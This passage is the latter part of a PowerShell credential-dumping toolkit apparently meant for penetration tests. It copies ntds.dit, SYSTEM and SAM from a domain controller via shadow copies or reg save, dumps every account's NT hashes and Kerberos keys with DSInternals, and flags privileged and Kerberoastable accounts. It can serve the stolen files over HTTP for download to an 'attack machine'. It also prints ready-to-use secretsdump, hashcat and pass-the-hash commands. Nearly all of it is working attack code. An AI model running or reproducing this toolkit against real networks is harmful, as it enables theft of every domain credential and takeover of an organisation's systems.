    } elseif ($ShadowPath -match "^\\\\\?\\GLOBALROOT") {
        # VSS path format
        $ntdsSource = "$ShadowPath\Windows\NTDS\ntds.dit"
        $systemSource = "$ShadowPath\Windows\System32\config\SYSTEM"
        $samSource = "$ShadowPath\Windows\System32\config\SAM"
    } else {
        # Try to append Windows path
        $ntdsSource = Join-Path $ShadowPath "Windows\NTDS\ntds.dit"
        $systemSource = Join-Path $ShadowPath "Windows\System32\config\SYSTEM"
        $samSource = Join-Path $ShadowPath "Windows\System32\config\SAM"
    }
    
    $results = @{
        NTDS = $null
        SYSTEM = $null
        SAM = $null
    }
    
    # Try different copy methods
    $copyMethods = @()
    
    if ($Tools.Robocopy.Available) {
        $copyMethods += @{
            Name = "Robocopy"
            Action = {
                param($src, $dst, $file)
                Copy-WithRobocopy -SourceDir (Split-Path $src) -DestDir $dst -FileName $file
            }
        }
    }
    
    if ($Tools.SeBackupPrivilege.Available) {
        $copyMethods += @{
            Name = "SeBackupPrivilege"
            Action = {
                param($src, $dst, $file)
                $destPath = Join-Path $dst $file
                Copy-WithSeBackupPrivilege -Source $src -Destination $destPath -ModulePath $Tools.SeBackupPrivilege.Path
                return $destPath
            }
        }
    }
    
    if ($Tools.Esentutl.Available) {
        $copyMethods += @{
            Name = "Esentutl"
            Action = {
                param($src, $dst, $file)
                $destPath = Join-Path $dst $file
                Copy-WithEsentutl -Source $src -Destination $destPath
                return $destPath
            }
        }
    }
    
    # Fallback: direct copy
    $copyMethods += @{
        Name = "DirectCopy"
        Action = {
            param($src, $dst, $file)
            $destPath = Join-Path $dst $file
            Copy-Item -Path $src -Destination $destPath -Force
            return $destPath
        }
    }
    
    # Copy NTDS.dit
    foreach ($method in $copyMethods) {
        try {
            Write-Status "Trying $($method.Name) for ntds.dit..." "Info"
            $results.NTDS = & $method.Action $ntdsSource $OutputDir "ntds.dit"
            if ($results.NTDS -and (Test-Path $results.NTDS)) {
                Write-Status "ntds.dit copied successfully using $($method.Name)" "Success"
                break
            }
        } catch {
            Write-Status "$($method.Name) failed for ntds.dit: $_" "Warning"
        }
    }
    
    # Copy SYSTEM
    foreach ($method in $copyMethods) {
        try {
            $results.SYSTEM = & $method.Action $systemSource $OutputDir "SYSTEM"
            if ($results.SYSTEM -and (Test-Path $results.SYSTEM)) {
                Write-Status "SYSTEM copied successfully" "Success"
                break
            }
        } catch {}
    }
    
    # Copy SAM
    foreach ($method in $copyMethods) {
        try {
            $results.SAM = & $method.Action $samSource $OutputDir "SAM"
            if ($results.SAM -and (Test-Path $results.SAM)) {
                Write-Status "SAM copied successfully" "Success"
                break
            }
        } catch {}
    }
    
    return $results
}

# ============================================================================
# BACKUP REGISTRY HIVES (ALTERNATIVE)
# ============================================================================
function Backup-RegistryHives {
    param([string]$OutputDir)
    
    Write-Status "Backing up registry hives using REG SAVE..." "Info"
    
    $systemPath = Join-Path $OutputDir "SYSTEM"
    $samPath = Join-Path $OutputDir "SAM"
    $securityPath = Join-Path $OutputDir "SECURITY"
    
    try {
        $null = reg save HKLM\SYSTEM $systemPath /y 2>&1
        if (Test-Path $systemPath) {
            Write-Status "SYSTEM hive saved: $systemPath" "Success"
        }
    } catch {}
    
    try {
        $null = reg save HKLM\SAM $samPath /y 2>&1
        if (Test-Path $samPath) {
            Write-Status "SAM hive saved: $samPath" "Success"
        }
    } catch {}
    
    try {
        $null = reg save HKLM\SECURITY $securityPath /y 2>&1
        if (Test-Path $securityPath) {
            Write-Status "SECURITY hive saved: $securityPath" "Success"
        }
    } catch {}
    
    return @{
        SYSTEM = $systemPath
        SAM = $samPath
        SECURITY = $securityPath
    }
}

# ============================================================================
# HASH EXTRACTION
# ============================================================================
function Extract-WithDSInternals {
    param(
        [string]$NTDSPath,
        [string]$SystemPath,
        [string]$OutputDir,
        [string]$ModulePath
    )
    
    Write-Status "Extracting hashes using DSInternals..." "Info"
    
    try {
        Import-Module $ModulePath -ErrorAction Stop
        
        # FIX: Resolve short paths (like SVC_BA~1) to full paths
        $NTDSPath = (Resolve-Path $NTDSPath -ErrorAction SilentlyContinue).Path
        $SystemPath = (Resolve-Path $SystemPath -ErrorAction SilentlyContinue).Path
        
        if (-not $NTDSPath -or -not $SystemPath) {
            throw "Could not resolve file paths"
        }
        
        Write-Status "Using NTDS: $NTDSPath" "Info"
        Write-Status "Using SYSTEM: $SystemPath" "Info"
        
        # FIX: Copy to a clean temp path if current path has issues
        $cleanPath = "C:\Windows\Temp\ntds_work_$(Get-Random)"
        $useCleanPath = $false
        
        # Try direct path first
        $bootKey = $null
        try {
            $bootKey = Get-BootKey -SystemHivePath $SystemPath -ErrorAction Stop
            Write-Status "Boot key extracted (direct path)" "Success"
        } catch {
            Write-Status "Direct path failed, trying clean temp path..." "Warning"
            
            # Copy to clean path
            New-Item -ItemType Directory -Path $cleanPath -Force | Out-Null
            Copy-Item $NTDSPath "$cleanPath\ntds.dit" -Force
            Copy-Item $SystemPath "$cleanPath\SYSTEM" -Force
            
            $NTDSPath = "$cleanPath\ntds.dit"
            $SystemPath = "$cleanPath\SYSTEM"
            $useCleanPath = $true
            
            $bootKey = Get-BootKey -SystemHivePath $SystemPath -ErrorAction Stop
            Write-Status "Boot key extracted (clean path)" "Success"
        }
        
        if (-not $bootKey) {
            throw "Failed to extract boot key"
        }
        
        # Extract all accounts
        $accounts = Get-ADDBAccount -All -DBPath $NTDSPath -BootKey $bootKey
        
        # DYNAMICALLY discover domain DN from the accounts (no hardcoding!)
        $domainDN = $null
        $sampleAccount = $accounts | Where-Object { $_.DistinguishedName -match "DC=" } | Select-Object -First 1
        if ($sampleAccount) {
            # Extract DC=xxx,DC=yyy from any DN
            if ($sampleAccount.DistinguishedName -match "(DC=.+)$") {
                $domainDN = $matches[1]
                Write-Status "Domain DN discovered: $domainDN" "Success"
            }
        }
        
        # Output files
        $hashFile = Join-Path $OutputDir "domain_hashes.txt"
        $detailFile = Join-Path $OutputDir "domain_accounts_detailed.txt"
        $secretsdumpFormat = Join-Path $OutputDir "secretsdump_format.txt"
        $kerberosKeys = Join-Path $OutputDir "kerberos_keys.txt"
        
        $hashOutput = @()
        $detailOutput = @()
        $secretsOutput = @()
        $kerbOutput = @()
        
        # Find high-value accounts dynamically
        $highValueAccounts = @()
        
        foreach ($account in $accounts) {
            # Build detailed output for EVERY account (like the reference shows)
            $detailOutput += "=" * 70
            $detailOutput += "DistinguishedName: $($account.DistinguishedName)"
            $detailOutput += "Sid: $($account.Sid)"
            $detailOutput += "Guid: $($account.Guid)"
            $detailOutput += "SamAccountName: $($account.SamAccountName)"
            $detailOutput += "SamAccountType: $($account.SamAccountType)"
            $detailOutput += "UserPrincipalName: $($account.UserPrincipalName)"
            $detailOutput += "PrimaryGroupId: $($account.PrimaryGroupId)"
            $detailOutput += "Enabled: $($account.Enabled)"
            $detailOutput += "UserAccountControl: $($account.UserAccountControl)"
            $detailOutput += "AdminCount: $($account.AdminCount)"
            $detailOutput += "Description: $($account.Description)"
            $detailOutput += "ServicePrincipalName: $($account.ServicePrincipalName -join ', ')"
            
            if ($account.NTHash) {
                $ntHash = [BitConverter]::ToString($account.NTHash).Replace("-", "").ToLower()
                $lmHash = "aad3b435b51404eeaad3b435b51404ee"
                if ($account.LMHash) {
                    $lmHash = [BitConverter]::ToString($account.LMHash).Replace("-", "").ToLower()
                }
                
                $detailOutput += "Secrets"
                $detailOutput += "  NTHash: $ntHash"
                $detailOutput += "  LMHash: $(if($account.LMHash){[BitConverter]::ToString($account.LMHash).Replace('-','').ToLower()}else{''})"
                
                # Secretsdump format: domain\user:RID:lmhash:nthash:::
                $rid = $account.Sid.Value.Split('-')[-1]
                $hashLine = "$($account.SamAccountName):${rid}:${lmHash}:${ntHash}:::"
                $hashOutput += $hashLine
                $secretsOutput += $hashLine
                
                # Track high-value targets (Admins, krbtgt, service accounts)
                if ($account.AdminCount -eq $true -or 
                    $account.SamAccountName -match "^(Administrator|krbtgt|admin)" -or
                    $account.ServicePrincipalName.Count -gt 0) {
                    $highValueAccounts += @{
                        Name = $account.SamAccountName
                        DN = $account.DistinguishedName
                        NTHash = $ntHash
                        SPN = $account.ServicePrincipalName
                        AdminCount = $account.AdminCount
                    }
                }
            }
            
            # Extract Kerberos keys if available (for AES, DES keys)
            if ($account.SupplementalCredentials) {
                $detailOutput += "  SupplementalCredentials:"
                
                $kerbNew = $account.SupplementalCredentials.KerberosNew
                if ($kerbNew -and $kerbNew.Credentials) {
                    $detailOutput += "    KerberosNew:"
                    $detailOutput += "      Credentials:"
                    foreach ($cred in $kerbNew.Credentials) {
                        $keyHex = [BitConverter]::ToString($cred.Key).Replace("-", "").ToLower()
                        $detailOutput += "        $($cred.KeyType)"
                        $detailOutput += "          Key: $keyHex"
                        $detailOutput += "          Iterations: $($cred.Iterations)"
                        
                        # Save kerberos keys separately
                        $kerbOutput += "$($account.SamAccountName):$($cred.KeyType):$keyHex"
                    }
                    $detailOutput += "      Salt: $($kerbNew.Salt)"
                }
                
                $kerbOld = $account.SupplementalCredentials.Kerberos
                if ($kerbOld -and $kerbOld.Credentials) {
                    $detailOutput += "    Kerberos:"
                    $detailOutput += "      Credentials:"
                    foreach ($cred in $kerbOld.Credentials) {
                        $keyHex = [BitConverter]::ToString($cred.Key).Replace("-", "").ToLower()
                        $detailOutput += "        $($cred.KeyType)"
                        $detailOutput += "          Key: $keyHex"
                    }
                }
            }
            
            $detailOutput += ""
        }
        
        # Write all output files
        $hashOutput | Out-File -FilePath $hashFile -Encoding ASCII
        $detailOutput | Out-File -FilePath $detailFile -Encoding ASCII
        $secretsOutput | Out-File -FilePath $secretsdumpFormat -Encoding ASCII
        if ($kerbOutput.Count -gt 0) {
            $kerbOutput | Out-File -FilePath $kerberosKeys -Encoding ASCII
        }
        
        Write-Status "Hashes extracted: $hashFile" "Success"
        Write-Status "Detailed accounts: $detailFile" "Success"
        Write-Status "Secretsdump format: $secretsdumpFormat" "Success"
        if ($kerbOutput.Count -gt 0) {
            Write-Status "Kerberos keys: $kerberosKeys" "Success"
        }
        Write-Status "Total accounts with NT hashes: $($hashOutput.Count)" "Info"
        
        # Display high-value targets
        if ($highValueAccounts.Count -gt 0) {
            Write-Section "HIGH-VALUE TARGETS DISCOVERED"
            foreach ($hv in $highValueAccounts) {
                Write-Host ""
                Write-Host "  Account: $($hv.Name)" -ForegroundColor $Script:Colors.Success
                Write-Host "  NT Hash: $($hv.NTHash)" -ForegroundColor $Script:Colors.Info
                if ($hv.SPN.Count -gt 0) {
                    Write-Host "  SPNs (Kerberoastable): $($hv.SPN -join ', ')" -ForegroundColor $Script:Colors.Warning
                }
                if ($hv.AdminCount) {
                    Write-Host "  [!] AdminCount=True (Privileged)" -ForegroundColor $Script:Colors.Warning
                }
            }
        }
        
        # Generate dynamic query commands for the user
        Write-Section "DYNAMIC DSINTERNALS COMMANDS"
        Write-Host @"

# These commands use YOUR extracted files - no hardcoded values!
# Domain DN discovered: $domainDN

# Import module and get boot key
Import-Module $ModulePath
`$key = Get-BootKey -SystemHivePath '$SystemPath'

# Get ALL accounts
Get-ADDBAccount -All -DBPath '$NTDSPath' -BootKey `$key

# Get specific account by SamAccountName (dynamic)
Get-ADDBAccount -SamAccountName 'Administrator' -DBPath '$NTDSPath' -BootKey `$key

# Get specific account by DN (using discovered domain)
Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,$domainDN' -DBPath '$NTDSPath' -BootKey `$key

# Get all enabled users
Get-ADDBAccount -All -DBPath '$NTDSPath' -BootKey `$key | Where-Object { `$_.Enabled -eq `$true }

# Get accounts with SPNs (Kerberoastable)
Get-ADDBAccount -All -DBPath '$NTDSPath' -BootKey `$key | Where-Object { `$_.ServicePrincipalName.Count -gt 0 }

# Get AdminCount accounts (privileged)
Get-ADDBAccount -All -DBPath '$NTDSPath' -BootKey `$key | Where-Object { `$_.AdminCount -eq `$true }

# Export hashes in hashcat format
Get-ADDBAccount -All -DBPath '$NTDSPath' -BootKey `$key | Format-Custom -View HashcatNT | Out-File hashes_hashcat.txt

"@ -ForegroundColor $Script:Colors.Info
        
        # Cleanup before return
        if ($useCleanPath -and (Test-Path $cleanPath)) {
            Remove-Item $cleanPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        return @{
            HashFile = $hashFile
            DetailFile = $detailFile
            SecretsDumpFile = $secretsdumpFormat
            KerberosFile = $kerberosKeys
            Count = $hashOutput.Count
            HighValueTargets = $highValueAccounts
            DomainDN = $domainDN
        }
        
    } catch {
        Write-Status "DSInternals extraction failed: $_" "Error"
        Write-Status "Try running the script as Administrator or use secretsdump.py on your attack machine" "Warning"
        
        # Cleanup clean path if used
        if ($useCleanPath -and (Test-Path $cleanPath)) {
            Remove-Item $cleanPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        return $null
    }
}

function Show-SecretsDumpGuide {
    param(
        [string]$NTDSPath,
        [string]$SystemPath
    )
    
    Write-Section "SECRETSDUMP.PY COMMANDS"
    
    Write-Host @"

Copy these files to your attack machine:
  - $NTDSPath
  - $SystemPath

Then run:

  # Basic extraction (local)
  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

  # With specific output format
  secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile domain_hashes LOCAL

  # Just NTLM hashes
  secretsdump.py -ntds ntds.dit -system SYSTEM -just-dc-ntlm LOCAL

  # Including user status
  secretsdump.py -ntds ntds.dit -system SYSTEM -user-status LOCAL

  # History hashes
  secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL

"@ -ForegroundColor $Script:Colors.Info
}

# ============================================================================
# CLEANUP
# ============================================================================
function Remove-ShadowCopy {
    param([string]$ShadowPath)
    
    Write-Status "Cleaning up shadow copy..." "Info"
    
    # If it's an exposed drive, use diskshadow to unexpose
    if ($ShadowPath -match "^([A-Z]):?$") {
        $driveLetter = $matches[1]
        # Need to use the drive letter WITH colon for unexpose
        $script = @"
set verbose on
unexpose ${driveLetter}:
exit
"@
        $scriptPath = Join-Path $env:TEMP "cleanup_$(Get-Random).txt"
        $script | Out-File -FilePath $scriptPath -Encoding ASCII
        $result = Start-Process -FilePath "diskshadow.exe" -ArgumentList "/s `"$scriptPath`"" -Wait -NoNewWindow -PassThru
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
        
        # Also try to delete the shadow copy itself
        $deleteScript = @"
set verbose on
delete shadows all
exit
"@
        $deleteScriptPath = Join-Path $env:TEMP "delete_shadow_$(Get-Random).txt"
        $deleteScript | Out-File -FilePath $deleteScriptPath -Encoding ASCII
        # Commented out by default to preserve other shadow copies - uncomment if needed
        # Start-Process -FilePath "diskshadow.exe" -ArgumentList "/s `"$deleteScriptPath`"" -Wait -NoNewWindow
        Remove-Item $deleteScriptPath -Force -ErrorAction SilentlyContinue
        
        Write-Status "Shadow copy cleanup completed" "Success"
    }
    
    # Try vssadmin delete for VSS-created shadows
    try {
        if ($ShadowPath -match "HarddiskVolumeShadowCopy(\d+)") {
            $shadowNum = $matches[1]
            # Get the shadow ID and delete it
            $shadows = vssadmin list shadows 2>$null
            if ($shadows -match "Shadow Copy ID: ({[^}]+}).*HarddiskVolumeShadowCopy$shadowNum") {
                $shadowId = $matches[1]
                vssadmin delete shadows /shadow=$shadowId /quiet 2>&1 | Out-Null
                Write-Status "VSS shadow copy deleted" "Success"
            }
        }
    } catch {
        Write-Status "VSS cleanup skipped: $_" "Warning"
    }
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================
function Invoke-NTDSExtraction {
    Write-Banner
    
    # Step 1: Environment check
    $env = Test-Environment
    
    if (-not $env.IsDomainController) {
        Write-Status "WARNING: This does not appear to be a Domain Controller!" "Warning"
        Write-Status "NTDS.dit extraction requires DC access." "Warning"
        $continue = Read-Host "Continue anyway? (y/N)"
        if ($continue -ne 'y') { return }
    }
    
    # Step 2: Tool detection
    $tools = Test-Tools
    
    # Show guides for missing tools
    Write-Section "MISSING TOOL GUIDES"
    $missingTools = $tools.GetEnumerator() | Where-Object { -not $_.Value.Available -and $_.Value.Guide }
    if ($missingTools) {
        foreach ($tool in $missingTools) {
            Write-Host $tool.Value.Guide -ForegroundColor $Script:Colors.Warning
        }
    } else {
        Write-Status "All primary tools available!" "Success"
    }
    
    # Step 3: Setup output directory
    $outputDir = Get-DynamicOutputPath
    
    # Step 4: Create shadow copy (try all methods)
    Write-Section "SHADOW COPY CREATION"
    
    $shadowPath = $null
    $ifmResult = $null
    $shadowMethods = @()
    
    # Order methods by preference
    if ($tools.Diskshadow.Available) {
        $shadowMethods += @{
            Name = "Diskshadow"
            Action = {
                $driveLetter = Find-AvailableDriveLetter
                New-ShadowCopy-Diskshadow -DriveLetter $driveLetter
            }
        }
    }
    
    if ($tools.Ntdsutil.Available) {
        $shadowMethods += @{
            Name = "Ntdsutil IFM"
            Action = {
                New-ShadowCopy-Ntdsutil -OutputDir $outputDir
            }
        }
    }
    
    if ($tools.VSSAdmin.Available) {
        $shadowMethods += @{
            Name = "VSSAdmin"
            Action = { New-ShadowCopy-VSSAdmin }
        }
    }
    
    if ($tools.WMI.Available) {
        $shadowMethods += @{
            Name = "WMI"
            Action = { New-ShadowCopy-WMI }
        }
    }
    
    # Try each method
    foreach ($method in $shadowMethods) {
        try {
            Write-Status "Attempting: $($method.Name)..." "Info"
            $result = & $method.Action
            
            if ($result -is [hashtable] -and $result.Type -eq "IFM") {
                $ifmResult = $result
                Write-Status "IFM method successful!" "Success"
                break
            } elseif ($result) {
                $shadowPath = $result
                $Script:Results.Method = $method.Name
                Write-Status "$($method.Name) successful!" "Success"
                break
            }
        } catch {
            Write-Status "$($method.Name) failed: $_" "Warning"
        }
    }
    
    if (-not $shadowPath -and -not $ifmResult) {
        Write-Status "All shadow copy methods failed!" "Error"
        Write-Host @"

[MANUAL SHADOW COPY GUIDE]
==========================
If automated methods fail, try manually:

1. DISKSHADOW (interactive):
   diskshadow.exe
   > set verbose on
   > set metadata C:\Windows\Temp\meta.cab
   > set context clientaccessible
   > set context persistent
   > begin backup
   > add volume C: alias cdrive
   > create
   > expose %cdrive% E:
   > end backup
   > exit

2. VSSADMIN:
   vssadmin create shadow /for=C:
   # Note the Shadow Copy Volume Name, then:
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\ntds.dit C:\Temp\

3. NTDSUTIL:
   ntdsutil
   > activate instance ntds
   > ifm
   > create full C:\Temp\IFM
   > quit
   > quit

"@ -ForegroundColor $Script:Colors.Warning
        return
    }
    
    # Step 5: Copy files
    Write-Section "FILE EXTRACTION"
    
    $extractedFiles = $null
    
    if ($ifmResult) {
        # IFM already has the files
        $extractedFiles = @{
            NTDS = $ifmResult.NTDSPath
            SYSTEM = $ifmResult.SystemPath
            SAM = $ifmResult.SAMPath
        }
        Write-Status "Files already extracted via IFM" "Success"
    } else {
        $extractedFiles = Copy-FromShadow -ShadowPath $shadowPath -OutputDir $outputDir -Tools $tools
    }
    
    # Backup registry hives as additional method
    if (-not $extractedFiles.SYSTEM -or -not (Test-Path $extractedFiles.SYSTEM -ErrorAction SilentlyContinue)) {
        Write-Status "Attempting registry hive backup as fallback..." "Info"
        $regBackup = Backup-RegistryHives -OutputDir $outputDir
        if ($regBackup.SYSTEM -and (Test-Path $regBackup.SYSTEM)) {
            $extractedFiles.SYSTEM = $regBackup.SYSTEM
        }
        if ($regBackup.SAM -and (Test-Path $regBackup.SAM)) {
            $extractedFiles.SAM = $regBackup.SAM
        }
    }
    
    # Step 6: Extract hashes
    Write-Section "HASH EXTRACTION"
    
    if ($extractedFiles.NTDS -and $extractedFiles.SYSTEM) {
        Write-Status "NTDS.dit: $($extractedFiles.NTDS)" "Info"
        Write-Status "SYSTEM: $($extractedFiles.SYSTEM)" "Info"
        
        $hashResult = $null
        
        # Auto-run DSInternals if available (no flag needed!)
        if ($tools.DSInternals.Available) {
            Write-Status "DSInternals detected - attempting hash extraction..." "Info"
            
            # First, try to enable SeBackupPrivilege if not already enabled
            $privCheck = whoami /priv 2>$null
            if ($privCheck -notmatch "SeBackupPrivilege.*Enabled") {
                Write-Status "SeBackupPrivilege not enabled - attempting to enable..." "Warning"
                $privEnabled = Enable-SeBackupPrivilege
            }
            
            $hashResult = Extract-WithDSInternals -NTDSPath $extractedFiles.NTDS -SystemPath $extractedFiles.SYSTEM -OutputDir $outputDir -ModulePath $tools.DSInternals.Path
            
            if (-not $hashResult) {
                Write-Status "DSInternals failed - files extracted successfully, use secretsdump.py on attack machine" "Warning"
            }
        } else {
            Write-Status "DSInternals not available - showing manual extraction guide" "Warning"
        }
        
        # Always show secretsdump guide as alternative
        Show-SecretsDumpGuide -NTDSPath $extractedFiles.NTDS -SystemPath $extractedFiles.SYSTEM
        
    } else {
        Write-Status "Missing required files for hash extraction" "Error"
    }
    
    # Step 7: Cleanup
    if ($shadowPath) {
        try {
            Remove-ShadowCopy -ShadowPath $shadowPath
        } catch {}
    }
    
    # Step 8: Summary
    Write-Section "EXTRACTION SUMMARY"
    
    Write-Host "`nOutput Directory: $outputDir" -ForegroundColor $Script:Colors.Success
    Write-Host "`nExtracted Files:" -ForegroundColor $Script:Colors.Info
    
    Get-ChildItem -Path $outputDir -Recurse -File | ForEach-Object {
        $size = "{0:N2} MB" -f ($_.Length / 1MB)
        Write-Host "  $($_.FullName) ($size)" -ForegroundColor $Script:Colors.Success
    }
    
    Write-Host @"

[NEXT STEPS]
============
1. Transfer files to your attack machine
2. Run secretsdump.py for hash extraction
3. Crack hashes with hashcat:
   hashcat -m 1000 hashes.txt wordlist.txt
4. Use hashes for pass-the-hash attacks

[PASS-THE-HASH EXAMPLES]
========================
# CrackMapExec
crackmapexec smb <target> -u Administrator -H <nthash>

# Impacket psexec
psexec.py <domain>/<user>@<target> -hashes :<nthash>

# Evil-WinRM
evil-winrm -i <target> -u Administrator -H <nthash>

"@ -ForegroundColor $Script:Colors.Info

    # Offer to start HTTP server for easy download
    if ($ServeFiles -or (-not $ExtractOnly)) {
        Write-Host ""
        $startServer = "y"
        if (-not $ServeFiles) {
            $startServer = Read-Host "Start HTTP server to download files? (Y/n)"
        }
        
        if ($startServer -ne "n" -and $startServer -ne "N") {
            Start-FileServer -Path $outputDir -IP $ServeIP -Port $ServePort
        }
    }
}

# ============================================================================
# HELP
# ============================================================================
if ($Help) {
    Write-Host @"

NTDS.dit Extraction Toolkit
===========================

USAGE:
    .\ntds_extractor.ps1                      # Run full extraction + prompt for HTTP server
    .\ntds_extractor.ps1 -ServeFiles          # Auto-start HTTP server after extraction
    .\ntds_extractor.ps1 -ServeIP 10.10.14.5  # Specify your IP for HTTP server
    .\ntds_extractor.ps1 -ServePort 9000      # Use custom port (default: 8000)
    .\ntds_extractor.ps1 -OutputPath C:\Out   # Specify output directory
    .\ntds_extractor.ps1 -ExtractOnly         # Skip HTTP server prompt
    .\ntds_extractor.ps1 -Help                # Show this help

PARAMETERS:
    -ServeFiles     Automatically start HTTP server after extraction
    -ServeIP        Your IP address for HTTP server (auto-detected if not specified)
    -ServePort      Port for HTTP server (default: 8000)
    -OutputPath     Custom output directory
    -ExtractOnly    Skip HTTP server and hash extraction

REQUIREMENTS:
    - Domain Controller access
    - SeBackupPrivilege OR local administrator OR Backup Operators membership
    
METHODS USED (in order of preference):
    Shadow Copy: diskshadow -> ntdsutil IFM -> vssadmin -> WMI
    File Copy:   robocopy /B -> SeBackupPrivilege -> esentutl -> direct copy
    Hash Extract: DSInternals -> secretsdump.py (guide provided)

EXAMPLES:
    # Extract and serve files on port 8080
    .\ntds_extractor.ps1 -ServeFiles -ServePort 8080

    # Then on your Kali machine:
    wget http://<TARGET_IP>:8080/ntds.dit
    wget http://<TARGET_IP>:8080/SYSTEM
    secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

"@ -ForegroundColor Cyan
    return
}

# Run extraction
Invoke-NTDSExtraction
